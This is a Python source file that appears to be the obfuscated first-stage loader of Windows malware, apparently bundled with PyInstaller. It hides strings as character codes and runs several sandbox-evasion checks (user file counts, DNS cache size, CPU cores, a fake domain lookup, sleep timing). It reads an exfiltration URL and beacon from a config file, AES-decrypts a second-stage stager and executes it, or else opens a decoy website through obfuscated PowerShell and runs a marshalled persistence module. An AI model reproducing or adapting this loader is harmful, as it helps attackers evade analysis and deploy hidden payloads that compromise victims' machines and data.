from sys import argv, _MEIPASS
import builtins
from time import sleep, time
from random import randint
from json import load as lod
from win32event import CreateMutex
from win32api import GetLastError
from marshal import load
from io import BytesIO
from socket import gethostbyname


mut = CreateMutex(None, True, f"Global\\{chr(115)}{chr(99)}{chr(111)}{chr(114)}{chr(112)}")
os = __import__(f'{chr(110+1)}{chr(110+5)}')
if GetLastError() == 183:
    os._exit(0)


# Checking for legit or common file type presence, if absent than its sandbox
counter = 0
for dir in [os.path.join(os.path.expanduser('~'), '!o$n@#ads'.replace('@', 'l').replace('#', 'o').replace('!', 'D').replace('$', 'w')), os.path.join(os.path.expanduser('~'), '#cuments'.replace('#', 'Do'))]:
    for file_name in os.listdir(dir):
            if file_name.endswith(f'{chr(46)}{chr(112)}{chr(110)}{chr(103)}') or file_name.endswith(f'{chr(46)}{chr(112)}{chr(100)}{chr(102)}') or file_name.endswith(f'{chr(46)}{chr(100)}{chr(111)}{chr(99)}{chr(120)}') or file_name.endswith(f'{chr(46)}{chr(116)}{chr(120)}{chr(116)}') or file_name.endswith(f'{chr(46)}{chr(106)}{chr(112)}{chr(103)}') or file_name.endswith(f'{chr(46)}{chr(112)}{chr(112)}{chr(116)}{chr(120)}'):
                counter += 1
if counter < 5:
    os._exit(0)
    
# Check for non-existent domain, if returned true than its possibly simulation
try:
    gethostbyname("djnau23578d5fd3448csbcauisvnciuasna.com")
    os._exit(0)
except:
    pass

#  Checking for recent file access counts, should be atleast 5-10
dpath = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Recent', 'AutomaticDestinations')
files = [f for f in os.listdir(dpath) if os.path.isfile(os.path.join(dpath, f))]
del dpath
if len(files) < 5:
    os._exit(0)

# Check cpu logical cores, if too lessthan likely a sandbox
if(os.cpu_count() < 3):
    os._exit()

# Check for dns cache entries, if very less than likely a sandbox or new system
domains = set()
for line in os.popen(f'{chr(105)}{chr(112)}{chr(99)}{chr(111)}{chr(110)}{chr(102)}{chr(105)}{chr(103)}{chr(32)}{chr(47)}{chr(100)}{chr(105)}{chr(115)}{chr(112)}{chr(108)}{chr(97)}{chr(121)}{chr(100)}{chr(110)}{chr(115)}'):
    line = line.strip().lower()
    if line.startswith(f'{chr(114)}{chr(101)}{chr(99)}{chr(111)}{chr(114)}{chr(100)}{chr(32)}{chr(110)}{chr(97)}{chr(109)}{chr(101)}'):
        parts = line.split(":", 1)
        if len(parts) == 2:
            domain = parts[1].strip()
            domains.add(domain)
if len(domains) < 20:
    os._exit(0)

bdecode = getattr(__import__(f'{chr(98)}{chr(97)}{chr(115)}{chr(101)}{chr(54)}{chr(52)}'), f'{chr(98)}{chr(54)}{chr(52)}{chr(100)}{chr(101)}{chr(99)}{chr(111)}{chr(100)}{chr(101)}')
subp_ = __import__(f'{chr(115)}{chr(117)}{chr(98)}{chr(112)}{chr(114)}{chr(111)}{chr(99)}{chr(100 + 1)}{chr(115)}{chr(110+5)}')
OOO__ = getattr(builtins, '$>e^'.replace('>', 'x').replace('$', 'e').replace('^', 'c'))

if os.path.dirname(argv[0]).endswith(f'{chr(83)}{chr(116)}{chr(97)}{chr(114)}{chr(116)}{chr(117)}{chr(112)}') or os.path.dirname(argv[0]).endswith(f'{chr(76)}{chr(111)}{chr(99)}{chr(97)}{chr(108)}') or os.path.exists(os.path.join(os.environ[f'{chr(80)}{chr(82)}{chr(79)}{chr(71)}{chr(82)}{chr(65)}{chr(77)}{chr(68)}{chr(65)}{chr(84)}{chr(65)}'], f'{chr(98)}{chr(108)}{chr(107)}{chr(46)}{chr(116)}{chr(120)}{chr(116)}')):
    with open(os.path.join(_MEIPASS, f'{chr(103)}{chr(111)}{chr(97)}{chr(116)}{chr(46)}{chr(106)}{chr(115)}{chr(111)}{chr(110)}'), 'r') as o:
        content = lod(o)
    exfil_url = bdecode(content[f'{chr(101)}{chr(120)}{chr(102)}{chr(105)}{chr(108)}']).decode('utf-8').strip()
    beacon = bdecode(content[f'{chr(98)}{chr(108)}{chr(105)}{chr(110)}{chr(107)}']).decode('utf-8').strip()
    head = content[f'{chr(104)}{chr(101)}{chr(97)}{chr(100)}{chr(115)}']
    AES = __import__(f'{chr(67)}{chr(114)}{chr(121)}{chr(112)}{chr(116)}{chr(111)}{chr(46)}{chr(67)}{chr(105)}{chr(112)}{chr(104)}{chr(101)}{chr(114)}', fromlist=[f'{chr(60+5)}{chr(69)}{chr(83)}']).AES
    unpad = __import__("Crypto.Util.Padding", fromlist=["unpad"]).unpad
    # Time check to see if sleep calls are patched or fast forwarded by sandbox
    s = time()
    sleep(randint(60,180))
    e = time()
    if(e-s) < 60:
        os._exit(0)
    datetime = __import__(f'{chr(100)}{chr(97)}{chr(116)}{chr(101)}{chr(116)}{chr(105)}{chr(109)}{chr(101)}')
    obj = datetime.datetime.strptime(content[f'{chr(97)}{chr(99)}{chr(116)}{chr(105)}{chr(118)}{chr(97)}{chr(116)}{chr(101)}'].strip(),  "%Y %m %d")
    if datetime.datetime.now() >= obj:
        with open(os.path.join(_MEIPASS, f'{chr(115)}{chr(116)}{chr(97)}{chr(103)}{chr(101)}{chr(50)}{chr(46)}{chr(116)}{chr(120)}{chr(116)}'), "r") as o:
                stager = o.read()
                enc_text = bdecode(stager.split(f'{chr(42)}')[0])
                enc_key = bdecode(stager.split(f'{chr(30+12)}')[1])
                iv = enc_text[:AES.block_size]
                enc_text = enc_text[AES.block_size:]
                cipher = AES.new(enc_key, AES.MODE_CBC, iv=iv)
                b  = unpad(cipher.decrypt(enc_text), AES.block_size)
                decoded = b.decode('utf-8', 'ignore').strip()
                get = getattr(__import__(f'{chr(114)}{chr(101)}{chr(113)}{chr(117)}{chr(101)}{chr(115)}{chr(116)}{chr(115)}'), f'{chr(103)}{chr(101)}{chr(116)}')
                OOO__(decoded)
else:
    subp_.run('pOWerSHELl.ExE /"C"OM Sta"r"t"-Proc"e"ss" https://www.welingkar.org/', shell=True, creationflags = subp_.CREATE_NO_WINDOW, stderr = subp_.DEVNULL)
    with open(os.path.join(_MEIPASS, f'{chr(112)}{chr(101)}{chr(114)}{chr(115)}{chr(105)}{chr(115)}{chr(116)}{chr(46)}{chr(112)}{chr(121)}{chr(99)}'), 'rb') as f:
        f.seek(20+4)
        OOO__(load(f))

